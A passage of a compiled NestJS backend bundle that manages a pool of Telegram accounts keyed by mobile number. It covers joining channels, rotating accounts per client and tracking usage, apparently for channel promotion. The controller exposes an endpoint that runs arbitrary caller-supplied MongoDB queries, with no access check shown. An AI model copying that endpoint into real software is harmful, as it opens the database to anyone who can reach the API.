const create_promote_client_dto_1 = __webpack_require__(/*! ./create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts");
class UpdatePromoteClientDto extends (0, swagger_1.PartialType)(create_promote_client_dto_1.CreatePromoteClientDto) {
}
exports.UpdatePromoteClientDto = UpdatePromoteClientDto;


/***/ }),

/***/ "./src/components/promote-clients/index.ts":
/*!*************************************************!*\
  !*** ./src/components/promote-clients/index.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./promote-client.controller */ "./src/components/promote-clients/promote-client.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-client.module */ "./src/components/promote-clients/promote-client.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/promote-clients/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/promote-clients/schemas/index.ts"), exports);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.controller.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.controller.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_client_service_1 = __webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const create_promote_client_dto_1 = __webpack_require__(/*! ./dto/create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts");
const search_promote_client_dto_1 = __webpack_require__(/*! ./dto/search-promote-client.dto */ "./src/components/promote-clients/dto/search-promote-client.dto.ts");
const promote_client_schema_1 = __webpack_require__(/*! ./schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
const update_promote_client_dto_1 = __webpack_require__(/*! ./dto/update-promote-client.dto */ "./src/components/promote-clients/dto/update-promote-client.dto.ts");
let PromoteClientController = class PromoteClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return this.clientService.create(createClientDto);
    }
    async search(query) {
        return this.clientService.search(query);
    }
    async joinChannelsforPromoteClients() {
        return this.clientService.joinchannelForPromoteClients();
    }
    async updateInfo() {
        this.clientService.updateInfo();
        return 'initiated Checking';
    }
    async checkpromoteClients() {
        this.clientService.checkPromoteClients();
        return 'initiated Checking';
    }
    async addNewUserstoPromoteClients(body) {
        if (!body || !Array.isArray(body.goodIds) || !Array.isArray(body.badIds)) {
            throw new common_1.BadRequestException('goodIds and badIds must be arrays');
        }
        if (body.clientsNeedingPromoteClients && !Array.isArray(body.clientsNeedingPromoteClients)) {
            throw new common_1.BadRequestException('clientsNeedingPromoteClients must be an array');
        }
        this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds, body.clientsNeedingPromoteClients || [], undefined);
        return 'initiated Checking';
    }
    async findAll(status) {
        return this.clientService.findAll(status);
    }
    async setAsPromoteClient(mobile) {
        return this.clientService.setAsPromoteClient(mobile);
    }
    async findOne(mobile) {
        return this.clientService.findOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.clientService.update(mobile, updateClientDto);
    }
    async createdOrupdate(mobile, updateClientDto) {
        return this.clientService.createOrUpdate(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.clientService.remove(mobile);
    }
    async executeQuery(query) {
        return this.clientService.executeQuery(query);
    }
    async getPromoteClientDistribution() {
        return this.clientService.getPromoteClientDistribution();
    }
    async getPromoteClientsByStatus(status) {
        return this.clientService.getPromoteClientsByStatus(status);
    }
    async getPromoteClientsWithMessages() {
        return this.clientService.getPromoteClientsWithMessages();
    }
    async updateStatus(mobile, body) {
        if (body.status !== 'active' && body.status !== 'inactive') {
            throw new common_1.BadRequestException('Status must be either "active" or "inactive"');
        }
        return this.clientService.updateStatus(mobile, body.status, body.message);
    }
    async markAsActive(mobile, body = {}) {
        return this.clientService.markAsActive(mobile, body.message);
    }
    async markAsInactive(mobile, body) {
        return this.clientService.markAsInactive(mobile, body.reason);
    }
    async markAsUsed(mobile, body = {}) {
        return this.clientService.markAsUsed(mobile, body.message);
    }
    async updateLastUsed(mobile) {
        return this.clientService.updateLastUsed(mobile);
    }
    async getLeastRecentlyUsed(clientId, limit) {
        return this.clientService.getLeastRecentlyUsedPromoteClients(clientId, limit || 1);
    }
    async getNextAvailable(clientId) {
        return this.clientService.getNextAvailablePromoteClient(clientId);
    }
    async getUnusedPromoteClients(hoursAgo, clientId) {
        return this.clientService.getUnusedPromoteClients(hoursAgo || 24, clientId);
    }
    async getUsageStatistics(clientId) {
        return this.clientService.getUsageStatistics(clientId);
    }
};
exports.PromoteClientController = PromoteClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    (0, swagger_1.ApiBody)({ type: create_promote_client_dto_1.CreatePromoteClientDto }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_promote_client_dto_1.CreatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'mobile', required: false, description: 'Mobile number' }),
    (0, swagger_1.ApiQuery)({ name: 'firstName', required: false, description: 'First name' }),
    (0, swagger_1.ApiQuery)({ name: 'lastName', required: false, description: 'Last name' }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, description: 'Username' }),
    (0, swagger_1.ApiResponse)({ type: [promote_client_schema_1.PromoteClient] }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_promote_client_dto_1.SearchPromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('joinChannelsForPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Join Channels for PromoteClients' }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "joinChannelsforPromoteClients", null);
__decorate([
    (0, common_1.Get)('updateInfo'),
    (0, swagger_1.ApiOperation)({ summary: 'Update promote Clients Info' }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "updateInfo", null);
__decorate([
    (0, common_1.Get)('checkPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Check Promote Clients' }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "checkpromoteClients", null);
__decorate([
    (0, common_1.Post)('addNewUserstoPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Add New Users to Promote Clients' }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                goodIds: { type: 'array', items: { type: 'string' } },
                badIds: { type: 'array', items: { type: 'string' } },
                clientsNeedingPromoteClients: { type: 'array', items: { type: 'string' } }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "addNewUserstoPromoteClients", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, description: 'Filter by status (active/inactive)' }),
    (0, swagger_1.ApiResponse)({ type: [promote_client_schema_1.PromoteClient] }),
    __param(0, (0, common_1.Query)('status')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('SetAsPromoteClient/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Promote Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "setAsPromoteClient", null);
__decorate([
    (0, common_1.Get)('mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)('mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiBody)({ type: update_promote_client_dto_1.UpdatePromoteClientDto }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_client_dto_1.UpdatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "update", null);
__decorate([
    (0, common_1.Put)('mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiBody)({ type: update_promote_client_dto_1.UpdatePromoteClientDto }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_client_dto_1.UpdatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "createdOrupdate", null);
__decorate([
    (0, common_1.Delete)('mobile/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiResponse)({ type: null }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "executeQuery", null);
__decorate([
    (0, common_1.Get)('distribution'),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote client distribution per client' }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getPromoteClientDistribution", null);
__decorate([
    (0, common_1.Get)('status/:status'),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote clients by status' }),
    (0, swagger_1.ApiParam)({ name: 'status', description: 'Status to filter by (active/inactive)', type: String }),
    (0, swagger_1.ApiResponse)({ type: [promote_client_schema_1.PromoteClient] }),
    __param(0, (0, common_1.Param)('status')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getPromoteClientsByStatus", null);
__decorate([
    (0, common_1.Get)('messages/all'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all promote clients with their status messages' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getPromoteClientsWithMessages", null);
__decorate([
    (0, common_1.Patch)('status/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update status of a promote client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                status: { type: 'string', description: 'New status (active/inactive)' },
                message: { type: 'string', description: 'Status message (optional)' }
            },
            required: ['status']
        }
    }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "updateStatus", null);
__decorate([
    (0, common_1.Patch)('activate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a promote client as active' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                message: { type: 'string', description: 'Activation message (optional)' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "markAsActive", null);
__decorate([
    (0, common_1.Patch)('deactivate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a promote client as inactive' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                reason: { type: 'string', description: 'Reason for deactivation' }
            },
            required: ['reason']
        }
    }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "markAsInactive", null);
__decorate([
    (0, common_1.Patch)('mark-used/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Mark a promote client as used (update lastUsed timestamp)' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                message: { type: 'string', description: 'Usage message (optional)' }
            }
        }
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "markAsUsed", null);
__decorate([
    (0, common_1.Patch)('update-last-used/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update last used timestamp for a promote client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the promote client', type: String }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "updateLastUsed", null);
__decorate([
    (0, common_1.Get)('least-recently-used/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get least recently used promote clients for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID to get promote clients for', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, description: 'Number of promote clients to return', type: Number }),
    (0, swagger_1.ApiResponse)({ type: [promote_client_schema_1.PromoteClient] }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getLeastRecentlyUsed", null);
__decorate([
    (0, common_1.Get)('next-available/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get next available promote client for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID to get next available promote client for', type: String }),
    (0, swagger_1.ApiResponse)({ type: promote_client_schema_1.PromoteClient }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getNextAvailable", null);
__decorate([
    (0, common_1.Get)('unused'),
    (0, swagger_1.ApiOperation)({ summary: "Get promote clients that haven't been used for a specified time period" }),
    (0, swagger_1.ApiQuery)({ name: 'hoursAgo', required: false, description: 'Hours ago cutoff (default: 24)', type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String }),
    (0, swagger_1.ApiResponse)({ type: [promote_client_schema_1.PromoteClient] }),
    __param(0, (0, common_1.Query)('hoursAgo')),
    __param(1, (0, common_1.Query)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number, String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getUnusedPromoteClients", null);
__decorate([
    (0, common_1.Get)('usage-stats'),
    (0, swagger_1.ApiOperation)({ summary: 'Get usage statistics for promote clients' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String }),
    (0, swagger_1.ApiResponse)({
        schema: {
            type: 'object',
            properties: {
                totalClients: { type: 'number' },
                neverUsed: { type: 'number' },
                usedInLast24Hours: { type: 'number' },
                usedInLastWeek: { type: 'number' },
                averageUsageGap: { type: 'number' }
            }
        }
    }),
    __param(0, (0, common_1.Query)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "getUsageStatistics", null);
exports.PromoteClientController = PromoteClientController = __decorate([
    (0, swagger_1.ApiTags)('Promote Clients'),
    (0, common_1.Controller)('promoteclients'),
    __metadata("design:paramtypes", [promote_client_service_1.PromoteClientService])
], PromoteClientController);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.module.ts":
/*!*****************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.module.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_client_service_1 = __webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const promote_client_controller_1 = __webpack_require__(/*! ./promote-client.controller */ "./src/components/promote-clients/promote-client.controller.ts");
const promote_client_schema_1 = __webpack_require__(/*! ./schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
let PromoteClientModule = class PromoteClientModule {
};
exports.PromoteClientModule = PromoteClientModule;
exports.PromoteClientModule = PromoteClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: promote_client_schema_1.PromoteClient.name, schema: promote_client_schema_1.PromoteClientSchema, collection: 'promoteClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule),
            (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
            (0, common_1.forwardRef)(() => session_manager_1.SessionModule),
            bots_1.BotsModule
        ],
        controllers: [promote_client_controller_1.PromoteClientController],
        providers: [promote_client_service_1.PromoteClientService],
        exports: [promote_client_service_1.PromoteClientService]
    })
], PromoteClientModule);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.service.ts":
/*!******************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.service.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var PromoteClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientService = void 0;
const channels_service_1 = __webpack_require__(/*! ../channels/channels.service */ "./src/components/channels/channels.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const promote_client_schema_1 = __webpack_require__(/*! ./schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const channelinfo_1 = __webpack_require__(/*! ../../utils/telegram-utils/channelinfo */ "./src/utils/telegram-utils/channelinfo.ts");
const getProfilePics_1 = __webpack_require__(/*! ../Telegram/utils/getProfilePics */ "./src/components/Telegram/utils/getProfilePics.ts");
const deleteProfilePics_1 = __webpack_require__(/*! ../Telegram/utils/deleteProfilePics */ "./src/components/Telegram/utils/deleteProfilePics.ts");
const isPermanentError_1 = __importDefault(__webpack_require__(/*! ../../utils/isPermanentError */ "./src/utils/isPermanentError.ts"));
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const path_1 = __importDefault(__webpack_require__(/*! path */ "path"));
const checkMe_utils_1 = __webpack_require__(/*! ../../utils/checkMe.utils */ "./src/utils/checkMe.utils.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
const client_helper_utils_1 = __webpack_require__(/*! ../shared/client-helper.utils */ "./src/components/shared/client-helper.utils.ts");
let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
    constructor(promoteClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, bufferClientService, sessionService, botsService) {
        this.promoteClientModel = promoteClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.bufferClientService = bufferClientService;
        this.sessionService = sessionService;
        this.botsService = botsService;
        this.logger = new utils_1.Logger(PromoteClientService_1.name);
        this.joinChannelMap = new Map();
        this.leaveChannelMap = new Map();
        this.joinChannelIntervalId = null;
        this.leaveChannelIntervalId = null;
        this.isLeaveChannelProcessing = false;
        this.isJoinChannelProcessing = false;
        this.activeTimeouts = new Set();
        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
        this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
        this.LEAVE_CHANNEL_BATCH_SIZE = 10;
        this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER = 10;
        this.MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT = 12;
        this.MAX_MAP_SIZE = 100;
        this.CHANNEL_PROCESSING_DELAY = 10000;
        this.CLEANUP_INTERVAL = 10 * 60 * 1000;
        this.cleanupIntervalId = null;
        this.ONE_DAY_MS = 24 * 60 * 60 * 1000;
        this.THREE_MONTHS_MS = 3 * 30 * this.ONE_DAY_MS;
        this.INACTIVE_USER_CUTOFF_DAYS = 90;
        this.MIN_TOTAL_PROMOTE_CLIENTS = 12;
        this.AVAILABILITY_WINDOWS = [
            { name: 'today', days: 0, minRequired: 3 },
            { name: 'tomorrow', days: 1, minRequired: 5 },
            { name: 'oneWeek', days: 7, minRequired: 7 },
            { name: 'tenDays', days: 10, minRequired: 9 }
        ];
    }
    startMemoryCleanup() {
        if (this.cleanupIntervalId)
            return;
        this.cleanupIntervalId = setInterval(() => {
            this.performMemoryCleanup();
        }, this.CLEANUP_INTERVAL);
        this.activeTimeouts.add(this.cleanupIntervalId);
    }
    clearMemoryCleanup() {
        if (this.cleanupIntervalId) {
            clearInterval(this.cleanupIntervalId);
            this.activeTimeouts.delete(this.cleanupIntervalId);
            this.cleanupIntervalId = null;
        }
    }
    performMemoryCleanup() {
        try {
            for (const [mobile, channels] of this.joinChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    this.logger.debug(`Cleaning up empty joinChannelMap entry for mobile: ${mobile}`);
                    this.joinChannelMap.delete(mobile);
                }
            }
